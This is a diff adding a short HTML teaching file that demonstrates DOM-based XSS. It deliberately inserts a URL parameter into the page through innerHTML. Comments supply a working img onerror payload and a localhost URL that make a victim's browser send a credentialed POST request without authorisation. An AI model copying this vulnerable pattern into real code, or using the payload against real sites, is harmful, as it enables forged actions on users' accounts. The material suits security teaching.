@@ -1,0 +1,31 @@
+<html>
+    <body>
+        <div>
+            <!-- Vulnerable code -->
+            Welcome, <span id="username"></span>
+        </div>
+        <script>
+            const params = new URLSearchParams(window.location.search)
+            const name = params.get('name')
+            document.getElementById('username').innerHTML = name;
+        </script>
+        <script>
+            function createPost(title, description) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "/endpoint", true);
+                xhr.withCredentials = true;
+                xhr.setRequestHeader(
+                    "Content-type",
+                    "application/x-www-form-urlencoded"
+                )
+                xhr.send(`txtName=${title}&mtxMessage=${description}`)
+            }
+        </script>
+    </body>
+</html>
+
+<!-- <img src="error.png" onerror="createPost('HACK_TITLE', 'HACK_DESCRIPTION')"/> -->
+
+<!-- http://127.0.0.1:5500/security/xss/ex3-unauthorised.html?name=%3Cimg%20src=%22error.png%22%20onerror=%22createPost(%27HACK_TITLE%27,%20%27HACK_DESCRIPTION%27)%22/%3E -->
+
+<!-- we send post request without having access -->
